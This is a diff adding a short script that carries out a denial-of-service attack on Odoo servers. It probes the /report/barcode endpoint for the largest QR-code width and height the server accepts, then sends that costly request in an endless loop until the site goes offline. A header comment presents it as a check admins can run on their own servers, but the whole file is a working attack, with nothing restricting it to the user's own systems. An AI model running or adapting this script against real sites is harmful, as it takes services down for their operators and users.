@@ -1,0 +1,53 @@
+// min-v 11.2.0
+// Simple DoS
+// What is shown here was reported to Odoo (but ignored as it was not considered important).
+// You can use this script to determine if any action is required on your server to mitigate the problem.
+
+$odoo_ver = (version)
+print "Determining vulnerable location..."
+$vuln_location = ''
+for ($i = 20000; $i > 0; $i = $i - 100) {
+    $full_vuln_location = ''
+    if ($odoo_ver[0] < 16) {
+        $full_vuln_location = '/report/barcode/?type=QR&value=DoSed&width=' + $i + '&height=' + $i
+    } else {
+        $full_vuln_location = '/report/barcode/QR/DoSed?width=' + $i + '&height=' + $i
+    }
+    print $full_vuln_location
+    $resp = (fetch -u $full_vuln_location -o {method: 'GET'} -t 3000)
+    if ($resp) {
+        if ($resp['status'] == 200) {
+            $vuln_location = $full_vuln_location
+            break
+        }
+    } else {
+        if ($resp == null) {
+            print "Website offline! (Has endured less than expected :S)"
+            return -1 
+        }
+    }
+}
+
+if (!$vuln_location) {
+    print "Can't determine the location... aborting!"
+    return -1
+}
+
+print 'Used location: ' + $vuln_location
+$count = 1
+for (;1;) {
+    print 'Sending request #' + $count + '...'
+    $resp = (fetch -u $full_vuln_location -o {method: 'GET'} -t 100)
+    if ($resp) {
+        if ($resp['status'] != 200) {
+            print "Website offline! (Proxied)"
+            break
+        }
+    } else {
+        if ($resp == null) {
+            print "Website offline!"
+            break 
+        }
+    }
+    $count = $count + 1
+}
